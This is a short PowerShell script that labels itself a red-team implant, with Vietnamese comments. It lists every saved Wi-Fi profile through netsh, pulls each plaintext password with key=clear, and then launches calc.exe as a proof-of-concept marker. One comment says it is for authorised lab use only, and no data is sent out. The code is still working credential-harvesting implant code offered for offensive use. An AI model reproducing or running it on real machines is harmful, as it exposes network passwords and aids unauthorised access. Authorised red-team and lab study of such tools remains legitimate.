Write-Host "Hello World from Kushy Red Team Implant"

function Get-WifiCredentials {
    <#
    .SYNOPSIS
      Lấy danh sách profile Wi-Fi và mật khẩu (key=clear) trên máy local.
    .NOTES
      Chỉ dùng trong môi trường được phép (máy local / lab).
    #>

    $profilesRaw = netsh wlan show profiles 2>$null
    if (-not $profilesRaw) { return @() }

    # lấy các dòng chứa profile (bền hơn với spacing và locale: tìm dấu ":" và phần sau)
    $profileNames = foreach ($line in $profilesRaw) {
        if ($line -match 'All User Profile\s*:\s*(.+)$' -or $line -match 'Profile\s*:\s*(.+)$') {
            $matches[1].Trim()
        }
        elseif ($line -match ':\s*(.+)$' -and $line -like '*Profile*') {
            # fallback generic (thận trọng)
            $matches[1].Trim()
        }
    } | Where-Object { $_ -and $_.Trim() } | Select-Object -Unique

    $results = foreach ($profile in $profileNames) {
        # call netsh for profile; suppress non-fatal errors
        $detail = netsh wlan show profile name="$profile" key=clear 2>$null
        $pw = $null

        if ($detail) {
            foreach ($dline in $detail) {
                # bền với spacing: tìm 'Key Content' hoặc 'Content' sau dấu :
                if ($dline -match 'Key Content\s*:\s*(.+)$' -or $dline -match 'Content\s*:\s*(.+)$') {
                    $pw = $matches[1].Trim()
                    break
                }
                # fallback: any line with 'Key' and ':' 
                if ($dline -match 'Key\s*:\s*(.+)$') {
                    $pw = $matches[1].Trim()
                    break
                }
            }
        }

        [PSCustomObject]@{
            ProfileName = $profile
            Password    = if ([string]::IsNullOrEmpty($pw)) { 'N/A' } else { $pw }
        }
    }

    return $results
}
$credentials = Get-WifiCredentials

Start-Process calc.exe
